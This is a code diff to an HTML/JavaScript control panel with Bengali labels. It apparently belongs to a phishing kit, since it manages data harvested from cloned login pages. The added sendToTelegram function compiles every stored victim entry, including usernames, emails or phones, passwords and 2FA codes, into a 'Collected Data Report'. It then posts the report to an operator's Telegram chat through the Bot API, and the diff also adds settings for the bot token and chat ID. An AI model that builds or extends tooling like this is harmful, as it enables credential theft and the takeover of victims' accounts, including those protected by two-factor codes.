@@ -9,6 +9,7 @@
             --primary-color: #4f46e5; --primary-hover: #4338ca;
             --danger-color: #dc2626; --danger-hover: #b91c1c;
             --success-color: #16a34a; --success-hover: #15803d;
+            --telegram-color: #0088cc; --telegram-hover: #0077b3;
             --bg-color: #f3f4f6; --widget-bg: #ffffff;
             --text-dark: #111827; --text-muted: #6b7280;
             --border-color: #e5e7eb;
@@ -79,6 +80,8 @@
         .btn-primary:hover { background-color: var(--primary-hover); }
         .btn-secondary { background-color: #e5e7eb; color: var(--text-dark); }
         .btn-secondary:hover { background-color: #d1d5db; }
+        .btn-telegram { background-color: var(--telegram-color); color: white; }
+        .btn-telegram:hover { background-color: var(--telegram-hover); }
 
         .actions-container { display: flex; flex-direction: column; gap: 15px; }
         .auto-refresh { display: flex; align-items: center; justify-content: space-between; padding: 10px; background-color: #f9fafb; border-radius: 8px; }
@@ -106,6 +109,18 @@
         .empty-data { color: var(--text-muted); font-style: italic; text-align: center; padding: 20px; }
         .view-details-btn { background-color: #3b82f6; color: white; padding: 4px 10px; font-size: 0.75rem; border-radius: 4px; border: none; cursor: pointer; }
         .sensitive-data { background: #fee2e2; color: #991b1b; padding: 2px 6px; border-radius: 4px; font-weight: 500; font-size: 0.75rem; }
+
+        /* Telegram Config */
+        .telegram-config {
+            background: #f0f9ff; border: 1px solid #bae6fd; border-radius: 8px; padding: 15px; margin-bottom: 15px;
+        }
+        .config-input-group { margin-bottom: 12px; }
+        .config-input-group label { display: block; margin-bottom: 5px; font-size: 0.8rem; font-weight: 600; color: #0369a1; }
+        .config-input-group input { width: 100%; padding: 8px 12px; border: 1px solid #bae6fd; border-radius: 6px; font-size: 0.8rem; }
+        .config-input-group input:focus { outline: none; border-color: #0284c7; box-shadow: 0 0 0 2px rgba(2, 132, 199, 0.1); }
+        .telegram-status { font-size: 0.75rem; padding: 8px; border-radius: 4px; text-align: center; margin-top: 10px; }
+        .status-connected { background: #dcfce7; color: #166534; border: 1px solid #bbf7d0; }
+        .status-disconnected { background: #fef2f2; color: #991b1b; border: 1px solid #fecaca; }
 
         /* Modals */
         .overlay { display: none; position: fixed; inset: 0; background: rgba(17, 24, 39, 0.6); backdrop-filter: blur(4px); z-index: 999; }
@@ -168,12 +183,32 @@
             <section class="widget data-actions-widget">
                 <h2 class="widget-title">কন্ট্রোল প্যানেল</h2>
                 <div class="actions-container">
-                     <div class="auto-refresh">
+                    <!-- Telegram Configuration -->
+                    <div class="telegram-config">
+                        <div class="config-input-group">
+                            <label for="botToken">Telegram Bot Token</label>
+                            <input type="text" id="botToken" placeholder="1234567890:ABCdefGHIjklMNOpqrsTUVwxyz" 
+                                   value="${localStorage.getItem('telegramBotToken') || ''}">
+                        </div>
+                        <div class="config-input-group">
+                            <label for="chatId">Chat ID</label>
+                            <input type="text" id="chatId" placeholder="123456789" 
+                                   value="${localStorage.getItem('telegramChatId') || ''}">
+                        </div>
+                        <div class="btn-group">
+                            <button class="btn btn-telegram" onclick="saveTelegramConfig()">সেভ করুন</button>
+                            <button class="btn btn-secondary" onclick="testTelegramConnection()">টেস্ট</button>
+                        </div>
+                        <div id="telegramStatus" class="telegram-status status-disconnected">কনফিগার করা হয়নি</div>
+                    </div>
+
+                    <div class="auto-refresh">
                         <span>অটো রিফ্রেশ</span>
                         <label class="switch"><input type="checkbox" id="autoRefreshToggle" onchange="toggleAutoRefresh()"><span class="slider"></span></label>
                     </div>
                     <div class="btn-group">
                         <button class="btn btn-success btn-icon" onclick="loadInputData()">রিফ্রেশ</button>
+                        <button class="btn btn-telegram btn-icon" onclick="sendToTelegram()">📤 Telegram</button>
                         <button class="btn btn-danger btn-icon" onclick="showDeleteConfirm()">সব ডিলিট</button>
                     </div>
                 </div>
@@ -220,6 +255,10 @@
 
         let selectedFile = null;
         let autoRefreshInterval = null;
+        let telegramConfig = {
+            botToken: localStorage.getItem('telegramBotToken') || '',
+            chatId: localStorage.getItem('telegramChatId') || ''
+        };
 
         // আইকন ম্যাপ (সঠিক করা হয়েছে)
         const iconMap = {
@@ -241,6 +280,108 @@
         };
         
         function getIconForFile(dataKey) { return iconMap[dataKey] || iconMap.default; }
+
+        // Telegram Functions
+        function saveTelegramConfig() {
+            const botToken = document.getElementById('botToken').value.trim();
+            const chatId = document.getElementById('chatId').value.trim();
+            
+            if (!botToken || !chatId) {
+                alert('দয়া করে Bot Token এবং Chat ID উভয়ই প্রদান করুন');
+                return;
+            }
+
+            telegramConfig.botToken = botToken;
+            telegramConfig.chatId = chatId;
+            
+            localStorage.setItem('telegramBotToken', botToken);
+            localStorage.setItem('telegramChatId', chatId);
+            
+            updateTelegramStatus('কনফিগার সেভ হয়েছে', true);
+        }
+
+        async function testTelegramConnection() {
+            if (!telegramConfig.botToken || !telegramConfig.chatId) {
+                alert('দয়া করে প্রথমে Bot Token এবং Chat ID সেট করুন');
+                return;
+            }
+
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${telegramConfig.botToken}/getMe`);
+                const data = await response.json();
+                
+                if (data.ok) {
+                    updateTelegramStatus(`বট কানেক্টেড: ${data.result.first_name}`, true);
+                } else {
+                    updateTelegramStatus('বট টোকেন ভুল', false);
+                }
+            } catch (error) {
+                updateTelegramStatus('কানেকশন ব্যর্থ', false);
+            }
+        }
+
+        async function sendToTelegram() {
+            if (!telegramConfig.botToken || !telegramConfig.chatId) {
+                alert('দয়া করে প্রথমে Telegram কনফিগারেশন সেট করুন');
+                return;
+            }
+
+            const storedData = getStoredData();
+            let message = '📊 *Collected Data Report*\\n\\n';
+            let totalEntries = 0;
+
+            files.forEach(file => {
+                if (storedData[file.dataKey] && storedData[file.dataKey].length > 0) {
+                    const data = storedData[file.dataKey];
+                    totalEntries += data.length;
+                    message += `*${file.name.replace('.html', '')}:* ${data.length} entries\\n`;
+                    
+                    data.forEach((item, index) => {
+                        const user = item.email || item.phone || item.username || 'N/A';
+                        const pass = item.pass || 'N/A';
+                        const code = item['2fa_code'] || 'N/A';
+                        message += `  ${index + 1}. User: ${user} | Pass: ${pass} | 2FA: ${code}\\n`;
+                    });
+                    message += '\\n';
+                }
+            });
+
+            if (totalEntries === 0) {
+                message = '❌ *No data collected yet*';
+            } else {
+                message = `📊 *Total Collected Data: ${totalEntries} entries*\\n\\n${message}`;
+            }
+
+            // Telegram API call
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${telegramConfig.botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: telegramConfig.chatId,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+
+                const result = await response.json();
+                if (result.ok) {
+                    alert('✅ ডাটা Telegram-এ সফলভাবে পাঠানো হয়েছে');
+                } else {
+                    alert('❌ Telegram-এ ডাটা পাঠানো ব্যর্থ: ' + (result.description || 'Unknown error'));
+                }
+            } catch (error) {
+                alert('❌ Network error: ' + error.message);
+            }
+        }
+
+        function updateTelegramStatus(message, isConnected) {
+            const statusElement = document.getElementById('telegramStatus');
+            statusElement.textContent = message;
+            statusElement.className = `telegram-status ${isConnected ? 'status-connected' : 'status-disconnected'}`;
+        }
 
         function renderFileGrid() {
             const gridElement = document.getElementById('fileGrid');
@@ -386,10 +527,20 @@
             }
         }
 
+        // Initialize Telegram status on load
+        function initTelegramStatus() {
+            if (telegramConfig.botToken && telegramConfig.chatId) {
+                updateTelegramStatus('কনফিগার করা হয়েছে', true);
+            } else {
+                updateTelegramStatus('কনফিগার করা হয়নি', false);
+            }
+        }
+
         window.addEventListener('load', () => {
             renderFileGrid();
             if (files.length > 0) selectFile(files[0]);
             loadInputData();
+            initTelegramStatus();
         });
 
         document.getElementById('overlay').addEventListener('click', closeDetails);
